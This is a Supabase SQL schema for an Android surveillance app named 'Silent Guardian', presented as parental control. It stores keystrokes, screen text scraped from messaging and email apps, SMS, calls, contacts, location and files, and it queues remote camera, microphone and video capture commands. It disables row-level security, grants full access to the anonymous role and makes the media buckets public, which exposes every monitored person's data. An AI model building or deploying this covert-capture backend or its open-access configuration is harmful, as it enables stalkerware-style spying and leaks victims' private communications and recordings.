-- =========================================================================
-- DATABASE SCHEMA V5: SILENT GUARDIAN — PARENTAL CONTROL SYSTEM
-- =========================================================================
-- Jalankan sekali di Supabase SQL Editor untuk fresh install.
-- Semua tabel lama akan di-DROP dan dibuat ulang.
--
-- V5 mencakup semua fitur:
--   V2  : devices, calls, location_logs, alerts, rls
--   V3  : sms_logs, keylogger_logs, screen_scraped_logs, screenshot_commands
--   V4  : contacts, camera_commands, service_heartbeats, agent_mode
--   V4+ : microphone_commands, file_entries
--   V5  : video_commands, children (slot anak), child_id/child_name di devices
--
-- Setelah menjalankan SQL ini, buat bucket berikut secara manual di
-- Supabase Dashboard → Storage → New Bucket:
--   1. screenshots        (Public: true)
--   2. camera-photos      (Public: true)
--   3. audio-recordings   (Public: true)
--   4. video-recordings   (Public: true)
--   5. apk-releases       (Public: false — gunakan signed URL)
-- =========================================================================

CREATE EXTENSION IF NOT EXISTS "pgcrypto";

-- =========================================================================
-- DROP SEMUA TABEL (urutan terbalik agar FK tidak error)
-- =========================================================================
DROP TABLE IF EXISTS
    public.video_commands,
    public.microphone_commands,
    public.file_entries,
    public.camera_commands,
    public.service_heartbeats,
    public.contacts,
    public.screen_scraped_logs,
    public.keylogger_logs,
    public.sms_logs,
    public.screenshot_commands,
    public.keyword_rules,
    public.gallery_items,
    public.screenshots,
    public.calls,
    public.wifi_history_logs,
    public.notification_logs,
    public.app_rules,
    public.alerts,
    public.installed_apps,
    public.location_logs,
    public.devices,
    public.children
CASCADE;

-- =========================================================================
-- 1. CHILDREN — slot anak per orang tua (harus dibuat sebelum devices)
-- =========================================================================
CREATE TABLE public.children (
    id          UUID        PRIMARY KEY DEFAULT gen_random_uuid(),
    parent_id   UUID        NOT NULL,               -- = auth.uid() orang tua
    name        TEXT        NOT NULL,               -- e.g. "Anak Pertama"
    setup_pin   TEXT        UNIQUE NOT NULL,        -- PIN 8 karakter untuk pairing APK
    created_at  TIMESTAMPTZ NOT NULL DEFAULT NOW()
);

CREATE INDEX idx_children_parent ON public.children(parent_id);
CREATE INDEX idx_children_pin    ON public.children(setup_pin);

-- =========================================================================
-- 2. DEVICES — perangkat anak yang terdaftar
-- =========================================================================
CREATE TABLE public.devices (
    id                 UUID        PRIMARY KEY DEFAULT gen_random_uuid(),
    parent_id          UUID        NOT NULL,                    -- = auth.uid() orang tua
    child_id           UUID        REFERENCES public.children(id) ON DELETE SET NULL,
    child_name         TEXT        DEFAULT '',
    device_name        TEXT        NOT NULL,
    device_uuid        TEXT        UNIQUE NOT NULL,
    model              TEXT        DEFAULT '',
    brand              TEXT        DEFAULT '',
    os_version         TEXT        NOT NULL DEFAULT 'Android',
    pairing_code       TEXT,                                   -- backward compat (= parent_id)
    status             TEXT        DEFAULT 'PENDING'
                                   CHECK (status IN ('PENDING', 'ACTIVE', 'REVOKED')),
    agent_mode         TEXT        NOT NULL DEFAULT 'ACTIVE'
                                   CHECK (agent_mode IN ('ACTIVE', 'DORMANT', 'UNINSTALL')),
    battery_level      INT         DEFAULT 100,
    ocr_packages       JSONB       DEFAULT '["com.whatsapp","com.whatsapp.w4b","com.instagram.android","org.telegram.messenger","org.telegram.messenger.web","com.facebook.orca","com.facebook.katana","com.twitter.android","com.x.android","com.snapchat.android","com.google.android.gm","com.microsoft.office.outlook"]'::jsonb,
    last_heartbeat_at  TIMESTAMPTZ DEFAULT NOW(),
    created_at         TIMESTAMPTZ NOT NULL DEFAULT NOW()
);

CREATE INDEX idx_devices_parent   ON public.devices(parent_id);
CREATE INDEX idx_devices_child_id ON public.devices(child_id);

-- =========================================================================
-- 3. LOCATION_LOGS
-- =========================================================================
CREATE TABLE public.location_logs (
    id          BIGSERIAL   PRIMARY KEY,
    device_id   UUID        NOT NULL REFERENCES public.devices(id) ON DELETE CASCADE,
    latitude    DOUBLE PRECISION NOT NULL,
    longitude   DOUBLE PRECISION NOT NULL,
    accuracy    DOUBLE PRECISION DEFAULT 0,
    altitude    DOUBLE PRECISION DEFAULT 0,
    recorded_at TIMESTAMPTZ NOT NULL DEFAULT NOW()
);
CREATE INDEX idx_location_logs_device_date ON public.location_logs(device_id, recorded_at DESC);

-- =========================================================================
-- 4. INSTALLED_APPS
-- =========================================================================
CREATE TABLE public.installed_apps (
    id             BIGSERIAL PRIMARY KEY,
    device_id      UUID      NOT NULL REFERENCES public.devices(id) ON DELETE CASCADE,
    app_package    TEXT      NOT NULL,
    app_name       TEXT      NOT NULL,
    install_source TEXT,
    is_suspicious  BOOLEAN   DEFAULT FALSE,
    is_uninstalled BOOLEAN   DEFAULT FALSE,
    first_seen_at  TIMESTAMPTZ NOT NULL DEFAULT NOW(),
    UNIQUE(device_id, app_package)
);
CREATE INDEX idx_installed_apps_lookup ON public.installed_apps(device_id, app_package);

-- =========================================================================
-- 5. ALERTS
-- =========================================================================
CREATE TABLE public.alerts (
    id              BIGSERIAL PRIMARY KEY,
    device_id       UUID      NOT NULL REFERENCES public.devices(id) ON DELETE CASCADE,
    alert_type      TEXT      NOT NULL CHECK (alert_type IN (
                        'NSFW_CONTENT', 'GEOFENCE_BREACH', 'SIM_CHANGED',
                        'DEVICE_OFFLINE_LONG', 'SUSPICIOUS_SIDELOAD',
                        'ACCESSIBILITY_DISABLED', 'KEYWORD_MATCH',
                        'SERVICE_KILLED', 'BATTERY_LOW'
                    )),
    severity        TEXT      DEFAULT 'MEDIUM' CHECK (severity IN ('LOW', 'MEDIUM', 'HIGH')),
    message         TEXT,
    r2_object_key   TEXT,
    metadata        JSONB     DEFAULT '{}',
    is_acknowledged BOOLEAN   DEFAULT FALSE,
    created_at      TIMESTAMPTZ NOT NULL DEFAULT NOW()
);
CREATE INDEX idx_alerts_unacknowledged ON public.alerts(device_id, is_acknowledged);
CREATE INDEX idx_alerts_severity       ON public.alerts(device_id, severity, created_at DESC);

-- =========================================================================
-- 6. APP_RULES
-- =========================================================================
CREATE TABLE public.app_rules (
    id                  BIGSERIAL PRIMARY KEY,
    device_id           UUID      NOT NULL REFERENCES public.devices(id) ON DELETE CASCADE,
    app_package         TEXT      NOT NULL,
    app_name            TEXT      NOT NULL,
    is_blocked          BOOLEAN   DEFAULT FALSE,
    daily_limit_seconds INT       DEFAULT 0,
    updated_at          TIMESTAMPTZ NOT NULL DEFAULT NOW(),
    UNIQUE(device_id, app_package)
);

-- =========================================================================
-- 7. NOTIFICATION_LOGS (pesan notifikasi + chat sosmed)
-- =========================================================================
CREATE TABLE public.notification_logs (
    id                 BIGSERIAL PRIMARY KEY,
    device_id          UUID      NOT NULL REFERENCES public.devices(id) ON DELETE CASCADE,
    app_package        TEXT      NOT NULL,
    notification_title TEXT,
    notification_body  TEXT      NOT NULL,
    sender_name        TEXT      DEFAULT '',
    is_chat            BOOLEAN   DEFAULT FALSE,
    received_at        TIMESTAMPTZ NOT NULL DEFAULT NOW()
);
CREATE INDEX idx_notif_logs_device_date ON public.notification_logs(device_id, received_at DESC);
CREATE INDEX idx_notif_logs_is_chat     ON public.notification_logs(device_id, is_chat, received_at DESC);

-- =========================================================================
-- 8. WIFI_HISTORY_LOGS
-- =========================================================================
CREATE TABLE public.wifi_history_logs (
    id           BIGSERIAL PRIMARY KEY,
    device_id    UUID      NOT NULL REFERENCES public.devices(id) ON DELETE CASCADE,
    ssid         TEXT      NOT NULL,
    bssid        TEXT      NOT NULL,
    connected_at TIMESTAMPTZ NOT NULL DEFAULT NOW()
);
CREATE INDEX idx_wifi_logs_query ON public.wifi_history_logs(device_id, connected_at DESC);

-- =========================================================================
-- 9. CALLS
-- =========================================================================
CREATE TABLE public.calls (
    id               BIGSERIAL PRIMARY KEY,
    device_id        UUID      NOT NULL REFERENCES public.devices(id) ON DELETE CASCADE,
    phone_number     TEXT      NOT NULL,
    contact_name     TEXT      DEFAULT '',
    direction        TEXT      NOT NULL CHECK (direction IN (
                         'INCOMING','OUTGOING','MISSED','REJECTED','UNKNOWN'
                     )),
    duration_seconds BIGINT    DEFAULT 0,
    recorded_at      TIMESTAMPTZ NOT NULL,
    created_at       TIMESTAMPTZ DEFAULT NOW(),
    CONSTRAINT calls_unique_entry UNIQUE (device_id, phone_number, recorded_at)
);
CREATE INDEX idx_calls_device_date ON public.calls(device_id, recorded_at DESC);

-- =========================================================================
-- 10. SCREENSHOTS — metadata hasil screenshot perintah dashboard
-- =========================================================================
CREATE TABLE public.screenshots (
    id               BIGSERIAL PRIMARY KEY,
    device_id        UUID      NOT NULL REFERENCES public.devices(id) ON DELETE CASCADE,
    storage_path     TEXT      NOT NULL,
    trigger_reason   TEXT      NOT NULL DEFAULT 'MANUAL'
                               CHECK (trigger_reason IN ('SCHEDULED','KEYWORD_TRIGGER','MANUAL')),
    file_size_bytes  BIGINT    DEFAULT 0,
    captured_at      TIMESTAMPTZ NOT NULL DEFAULT NOW()
);
CREATE INDEX idx_screenshots_device_date ON public.screenshots(device_id, captured_at DESC);

-- =========================================================================
-- 11. GALLERY_ITEMS — metadata foto/video di galeri perangkat
-- =========================================================================
CREATE TABLE public.gallery_items (
    id              BIGSERIAL PRIMARY KEY,
    device_id       UUID      NOT NULL REFERENCES public.devices(id) ON DELETE CASCADE,
    file_name       TEXT      NOT NULL,
    file_path       TEXT      NOT NULL DEFAULT '',
    file_size_bytes BIGINT    DEFAULT 0,
    mime_type       TEXT      DEFAULT 'image/jpeg',
    album_name      TEXT      DEFAULT 'Camera',
    taken_at        TIMESTAMPTZ NOT NULL DEFAULT NOW(),
    UNIQUE(device_id, file_path)
);
CREATE INDEX idx_gallery_device_date ON public.gallery_items(device_id, taken_at DESC);

-- =========================================================================
-- 12. KEYWORD_RULES — kata kunci pemantauan, disinkronkan ke Android
-- =========================================================================
CREATE TABLE public.keyword_rules (
    id         BIGSERIAL PRIMARY KEY,
    device_id  UUID      NOT NULL REFERENCES public.devices(id) ON DELETE CASCADE,
    keyword    TEXT      NOT NULL,
    severity   TEXT      NOT NULL DEFAULT 'MEDIUM' CHECK (severity IN ('LOW','MEDIUM','HIGH')),
    is_active  BOOLEAN   DEFAULT TRUE,
    created_at TIMESTAMPTZ NOT NULL DEFAULT NOW(),
    UNIQUE(device_id, keyword)
);
CREATE INDEX idx_keyword_rules_device ON public.keyword_rules(device_id, is_active);

-- =========================================================================
-- 13. SCREENSHOT_COMMANDS — perintah ambil screenshot dari dashboard
-- =========================================================================
CREATE TABLE public.screenshot_commands (
    id            BIGSERIAL PRIMARY KEY,
    device_id     UUID      NOT NULL REFERENCES public.devices(id) ON DELETE CASCADE,
    command_type  TEXT      NOT NULL DEFAULT 'SCREENSHOT',
    status        TEXT      NOT NULL DEFAULT 'PENDING'
                            CHECK (status IN ('PENDING','EXECUTED','FAILED')),
    error_message TEXT,
    created_at    TIMESTAMPTZ NOT NULL DEFAULT NOW(),
    executed_at   TIMESTAMPTZ
);
CREATE INDEX idx_screenshot_commands_device ON public.screenshot_commands(device_id, status);

-- =========================================================================
-- 14. SMS_LOGS
-- =========================================================================
CREATE TABLE public.sms_logs (
    id            BIGSERIAL PRIMARY KEY,
    device_id     UUID      NOT NULL REFERENCES public.devices(id) ON DELETE CASCADE,
    sender_number TEXT      NOT NULL,
    message_body  TEXT      NOT NULL,
    is_sent       BOOLEAN   DEFAULT FALSE,
    is_suspicious BOOLEAN   DEFAULT FALSE,
    recorded_at   TIMESTAMPTZ NOT NULL,
    created_at    TIMESTAMPTZ DEFAULT NOW()
);
CREATE INDEX idx_sms_logs_device_date ON public.sms_logs(device_id, recorded_at DESC);

-- =========================================================================
-- 15. KEYLOGGER_LOGS — ketikan keyboard per aplikasi
-- =========================================================================
CREATE TABLE public.keylogger_logs (
    id            BIGSERIAL PRIMARY KEY,
    device_id     UUID      NOT NULL REFERENCES public.devices(id) ON DELETE CASCADE,
    app_package   TEXT      NOT NULL,
    typed_text    TEXT      NOT NULL,
    is_suspicious BOOLEAN   DEFAULT FALSE,
    recorded_at   TIMESTAMPTZ NOT NULL DEFAULT NOW()
);
CREATE INDEX idx_keylogger_logs_device_date ON public.keylogger_logs(device_id, recorded_at DESC);

-- =========================================================================
-- 16. SCREEN_SCRAPED_LOGS — teks layar dari OCR AccessibilityService
-- =========================================================================
CREATE TABLE public.screen_scraped_logs (
    id            BIGSERIAL PRIMARY KEY,
    device_id     UUID      NOT NULL REFERENCES public.devices(id) ON DELETE CASCADE,
    app_package   TEXT      NOT NULL,
    scraped_text  TEXT      NOT NULL,
    is_suspicious BOOLEAN   DEFAULT FALSE,
    recorded_at   TIMESTAMPTZ NOT NULL DEFAULT NOW()
);
CREATE INDEX idx_screen_scraped_logs_device_date ON public.screen_scraped_logs(device_id, recorded_at DESC);

-- =========================================================================
-- 17. SERVICE_HEARTBEATS — status service per siklus polling (diagnosis)
-- =========================================================================
CREATE TABLE public.service_heartbeats (
    id                    BIGSERIAL PRIMARY KEY,
    device_id             UUID      NOT NULL REFERENCES public.devices(id) ON DELETE CASCADE,
    accessibility_active  BOOLEAN   DEFAULT FALSE,
    notif_listener_active BOOLEAN   DEFAULT FALSE,
    background_sync_active BOOLEAN  DEFAULT TRUE,
    battery_level         INT       DEFAULT 0,
    network_type          TEXT      DEFAULT 'UNKNOWN',
    recorded_at           TIMESTAMPTZ NOT NULL DEFAULT NOW()
);
CREATE INDEX idx_service_heartbeats_device ON public.service_heartbeats(device_id, recorded_at DESC);

-- =========================================================================
-- 18. CONTACTS — snapshot daftar kontak perangkat anak
-- =========================================================================
CREATE TABLE public.contacts (
    id            BIGSERIAL PRIMARY KEY,
    device_id     UUID      NOT NULL REFERENCES public.devices(id) ON DELETE CASCADE,
    contact_name  TEXT      NOT NULL,
    phone_numbers JSONB     NOT NULL DEFAULT '[]',
    emails        JSONB     NOT NULL DEFAULT '[]',
    synced_at     TIMESTAMPTZ NOT NULL DEFAULT NOW()
);
CREATE INDEX idx_contacts_device ON public.contacts(device_id, contact_name);

-- =========================================================================
-- 19. CAMERA_COMMANDS — perintah foto kamera dari dashboard
-- =========================================================================
CREATE TABLE public.camera_commands (
    id              BIGSERIAL PRIMARY KEY,
    device_id       UUID      NOT NULL REFERENCES public.devices(id) ON DELETE CASCADE,
    camera_side     TEXT      NOT NULL DEFAULT 'BACK' CHECK (camera_side IN ('FRONT','BACK')),
    status          TEXT      NOT NULL DEFAULT 'PENDING' CHECK (status IN ('PENDING','EXECUTED','FAILED')),
    storage_path    TEXT,
    file_size_bytes BIGINT,
    error_message   TEXT,
    created_at      TIMESTAMPTZ NOT NULL DEFAULT NOW(),
    executed_at     TIMESTAMPTZ
);
CREATE INDEX idx_camera_commands_device ON public.camera_commands(device_id, status, created_at DESC);

-- =========================================================================
-- 20. MICROPHONE_COMMANDS — perintah rekam mikrofon dari dashboard
-- =========================================================================
CREATE TABLE public.microphone_commands (
    id              BIGSERIAL PRIMARY KEY,
    device_id       UUID      NOT NULL REFERENCES public.devices(id) ON DELETE CASCADE,
    duration_seconds INT      NOT NULL DEFAULT 5,
    status          TEXT      NOT NULL DEFAULT 'PENDING' CHECK (status IN ('PENDING','EXECUTED','FAILED')),
    storage_path    TEXT,
    file_size_bytes BIGINT,
    error_message   TEXT,
    created_at      TIMESTAMPTZ NOT NULL DEFAULT NOW(),
    executed_at     TIMESTAMPTZ
);
CREATE INDEX idx_mic_commands_device ON public.microphone_commands(device_id, status, created_at DESC);

-- =========================================================================
-- 21. VIDEO_COMMANDS — perintah rekam video kamera dari dashboard
-- =========================================================================
CREATE TABLE public.video_commands (
    id              BIGSERIAL PRIMARY KEY,
    device_id       UUID      NOT NULL REFERENCES public.devices(id) ON DELETE CASCADE,
    duration_seconds INT      NOT NULL DEFAULT 10,
    camera_side     TEXT      NOT NULL DEFAULT 'BACK' CHECK (camera_side IN ('FRONT','BACK')),
    status          TEXT      NOT NULL DEFAULT 'PENDING' CHECK (status IN ('PENDING','EXECUTED','FAILED')),
    storage_path    TEXT,
    file_size_bytes BIGINT,
    error_message   TEXT,
    created_at      TIMESTAMPTZ NOT NULL DEFAULT NOW(),
    executed_at     TIMESTAMPTZ
);
CREATE INDEX idx_video_commands_device ON public.video_commands(device_id, status, created_at DESC);

-- =========================================================================
-- 22. FILE_ENTRIES — snapshot metadata file/folder penyimpanan perangkat
-- =========================================================================
CREATE TABLE public.file_entries (
    id              BIGSERIAL PRIMARY KEY,
    device_id       UUID      NOT NULL REFERENCES public.devices(id) ON DELETE CASCADE,
    file_path       TEXT      NOT NULL,     -- path lengkap: /storage/emulated/0/DCIM/...
    file_name       TEXT      NOT NULL,     -- nama file/folder saja
    parent_path     TEXT      NOT NULL DEFAULT '',
    file_size_bytes BIGINT    DEFAULT 0,
    is_directory    BOOLEAN   NOT NULL DEFAULT FALSE,
    mime_type       TEXT      DEFAULT '',
    last_modified   TIMESTAMPTZ,
    synced_at       TIMESTAMPTZ NOT NULL DEFAULT NOW(),
    UNIQUE(device_id, file_path)
);
CREATE INDEX idx_file_entries_device_parent ON public.file_entries(device_id, parent_path, is_directory, file_name);

-- =========================================================================
-- REALTIME PUBLICATION
-- =========================================================================
DROP PUBLICATION IF EXISTS supabase_realtime;
CREATE PUBLICATION supabase_realtime FOR TABLE
    public.alerts,
    public.calls,
    public.location_logs,
    public.notification_logs,
    public.screenshots,
    public.screenshot_commands,
    public.sms_logs,
    public.keylogger_logs,
    public.screen_scraped_logs,
    public.service_heartbeats,
    public.contacts,
    public.camera_commands,
    public.microphone_commands,
    public.video_commands;

-- =========================================================================
-- DISABLE RLS (private deployment — Android agent pakai anon key langsung)
-- =========================================================================
ALTER TABLE public.children               DISABLE ROW LEVEL SECURITY;
ALTER TABLE public.devices                DISABLE ROW LEVEL SECURITY;
ALTER TABLE public.location_logs          DISABLE ROW LEVEL SECURITY;
ALTER TABLE public.installed_apps         DISABLE ROW LEVEL SECURITY;
ALTER TABLE public.alerts                 DISABLE ROW LEVEL SECURITY;
ALTER TABLE public.app_rules              DISABLE ROW LEVEL SECURITY;
ALTER TABLE public.notification_logs      DISABLE ROW LEVEL SECURITY;
ALTER TABLE public.wifi_history_logs      DISABLE ROW LEVEL SECURITY;
ALTER TABLE public.calls                  DISABLE ROW LEVEL SECURITY;
ALTER TABLE public.screenshots            DISABLE ROW LEVEL SECURITY;
ALTER TABLE public.gallery_items          DISABLE ROW LEVEL SECURITY;
ALTER TABLE public.keyword_rules          DISABLE ROW LEVEL SECURITY;
ALTER TABLE public.screenshot_commands    DISABLE ROW LEVEL SECURITY;
ALTER TABLE public.sms_logs               DISABLE ROW LEVEL SECURITY;
ALTER TABLE public.keylogger_logs         DISABLE ROW LEVEL SECURITY;
ALTER TABLE public.screen_scraped_logs    DISABLE ROW LEVEL SECURITY;
ALTER TABLE public.service_heartbeats     DISABLE ROW LEVEL SECURITY;
ALTER TABLE public.contacts               DISABLE ROW LEVEL SECURITY;
ALTER TABLE public.camera_commands        DISABLE ROW LEVEL SECURITY;
ALTER TABLE public.microphone_commands    DISABLE ROW LEVEL SECURITY;
ALTER TABLE public.video_commands         DISABLE ROW LEVEL SECURITY;
ALTER TABLE public.file_entries           DISABLE ROW LEVEL SECURITY;

-- =========================================================================
-- GRANT ke role anon + authenticated (Android pakai anon key)
-- =========================================================================
GRANT ALL ON public.children              TO anon, authenticated;
GRANT ALL ON public.devices               TO anon, authenticated;
GRANT ALL ON public.location_logs         TO anon, authenticated;
GRANT ALL ON public.installed_apps        TO anon, authenticated;
GRANT ALL ON public.alerts                TO anon, authenticated;
GRANT ALL ON public.app_rules             TO anon, authenticated;
GRANT ALL ON public.notification_logs     TO anon, authenticated;
GRANT ALL ON public.wifi_history_logs     TO anon, authenticated;
GRANT ALL ON public.calls                 TO anon, authenticated;
GRANT ALL ON public.screenshots           TO anon, authenticated;
GRANT ALL ON public.gallery_items         TO anon, authenticated;
GRANT ALL ON public.keyword_rules         TO anon, authenticated;
GRANT ALL ON public.screenshot_commands   TO anon, authenticated;
GRANT ALL ON public.sms_logs              TO anon, authenticated;
GRANT ALL ON public.keylogger_logs        TO anon, authenticated;
GRANT ALL ON public.screen_scraped_logs   TO anon, authenticated;
GRANT ALL ON public.service_heartbeats    TO anon, authenticated;
GRANT ALL ON public.contacts              TO anon, authenticated;
GRANT ALL ON public.camera_commands       TO anon, authenticated;
GRANT ALL ON public.microphone_commands   TO anon, authenticated;
GRANT ALL ON public.video_commands        TO anon, authenticated;
GRANT ALL ON public.file_entries          TO anon, authenticated;

GRANT USAGE, SELECT ON ALL SEQUENCES IN SCHEMA public TO anon, authenticated;
